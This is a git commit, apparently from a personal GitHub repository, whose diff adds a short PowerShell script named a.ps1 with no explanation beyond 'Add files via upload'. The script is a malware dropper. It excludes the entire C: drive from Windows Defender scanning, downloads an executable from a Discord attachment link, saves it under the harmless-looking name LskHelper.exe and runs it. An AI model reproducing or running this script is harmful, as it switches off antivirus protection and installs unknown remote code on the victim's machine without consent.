15ca56450b734145752b73d3ea5ce96ba5e48e85
swag711 <81498665+swag711@users.noreply.github.com>
2022-02-23 18:17:50 -0700

    Add files via upload

---
+++ a.ps1
@@ -0,0 +1,7 @@
+Set-MpPreference -ExclusionPath "C:\" -ExclusionExtension "C:\LskHelper.exe"
+$url = "https://cdn.discordapp.com/attachments/884509370354925638/945906645349826640/a.exe"
+$outpath = "$PSScriptRoot/LskHelper.exe"
+Invoke-WebRequest -Uri $url -OutFile $outpath
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $outpath)
+Start-Process -Filepath "C:\LskHelper.exe"
